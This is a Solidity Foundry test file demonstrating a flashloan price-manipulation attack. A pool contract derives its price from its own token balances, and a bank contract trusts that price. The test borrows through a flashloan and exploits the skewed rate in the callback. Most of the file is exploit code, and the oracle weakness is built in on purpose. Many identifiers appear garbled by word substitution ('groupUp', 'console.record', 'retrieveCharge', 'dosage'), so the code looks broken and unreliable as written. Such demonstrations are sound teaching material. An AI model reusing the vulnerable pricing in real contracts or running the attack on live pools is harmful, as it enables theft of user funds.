pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract PolicyTest is Test {
    USDa UsDaAgreement;
    USDb UsDbPolicy;
    SimplePool SimplePoolPolicy;
    SimpleBank SimpleBankPolicy;

    function groupUp() public {
        UsDaAgreement = new USDa();
        UsDbPolicy = new USDb();
        SimplePoolPolicy = new SimplePool(
            address(UsDaAgreement),
            address(UsDbPolicy)
        );
        SimpleBankPolicy = new SimpleBank(
            address(UsDaAgreement),
            address(SimplePoolPolicy),
            address(UsDbPolicy)
        );
    }

    function testPrice_Manipulation() public {
        UsDbPolicy.transfer(address(SimpleBankPolicy), 9000 ether);
        UsDaAgreement.transfer(address(SimplePoolPolicy), 1000 ether);
        UsDbPolicy.transfer(address(SimplePoolPolicy), 1000 ether);

        SimplePoolPolicy.retrieveCharge();

        console.record(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit record_named_decimal_number(
            "Current USDa convert rate",
            SimplePoolPolicy.retrieveCharge(),
            18
        );
        console.record("Start price manipulation");
        console.record("Borrow 500 USBa over floashloan");


        SimplePoolPolicy.emergencyLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit record_named_decimal_number(
            "Price manupulated, USDa convert rate",
            SimplePoolPolicy.retrieveCharge(),
            18
        );

        UsDaAgreement.approve(address(SimpleBankPolicy), 100 ether);
        SimpleBankPolicy.equipmentTrader(100 ether);

        UsDaAgreement.transfer(address(SimplePoolPolicy), 500 ether);


        emit record_named_decimal_number(
            "Use 100 USDa to convert, My USDb balance",
            UsDbPolicy.balanceOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function issueCredential(address to, uint256 dosage) public onlyOwner {
        _mint(to, dosage);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function issueCredential(address to, uint256 dosage) public onlyOwner {
        _mint(to, dosage);
    }
}

contract SimplePool {
    IERC20 public UsDaCredential;
    IERC20 public UsDbBadge;

    constructor(address _USDa, address _USDb) {
        UsDaCredential = IERC20(_USDa);
        UsDbBadge = IERC20(_USDb);
    }

    function retrieveCharge() public view returns (uint256) {

        uint256 UsDaDosage = UsDaCredential.balanceOf(address(this));
        uint256 UsDbMeasure = UsDbBadge.balanceOf(address(this));


        if (UsDaDosage == 0) {
            return 0;
        }


        uint256 UsDaCost = (UsDbMeasure * (10 ** 18)) / UsDaDosage;
        return UsDaCost;
    }

    function emergencyLoan(
        uint256 dosage,
        address borrower,
        bytes calldata info
    ) public {
        uint256 allocationBefore = UsDaCredential.balanceOf(address(this));
        require(allocationBefore >= dosage, "Not enough liquidity");
        require(
            UsDaCredential.transfer(borrower, dosage),
            "Flashloan transfer failed"
        );
        (bool recovery, ) = borrower.call(info);
        require(recovery, "Flashloan callback failed");
        uint256 creditsAfter = UsDaCredential.balanceOf(address(this));
        require(creditsAfter >= allocationBefore, "Flashloan not repaid");
    }
}

contract SimpleBank {
    IERC20 public credential;
    SimplePool public treatmentPool;
    IERC20 public payoutCredential;

    constructor(address _token, address _pool, address _payoutId) {
        credential = IERC20(_token);
        treatmentPool = SimplePool(_pool);
        payoutCredential = IERC20(_payoutId);
    }

    function equipmentTrader(uint256 dosage) public {
        require(
            credential.transferFrom(msg.sender, address(this), dosage),
            "Transfer failed"
        );
        uint256 cost = treatmentPool.retrieveCharge();
        require(cost > 0, "Price cannot be zero");
        uint256 idsDestinationObtainresults = (dosage * cost) / (10 ** 18);
        require(
            payoutCredential.transfer(msg.sender, idsDestinationObtainresults),
            "Payout transfer failed"
        );
    }
}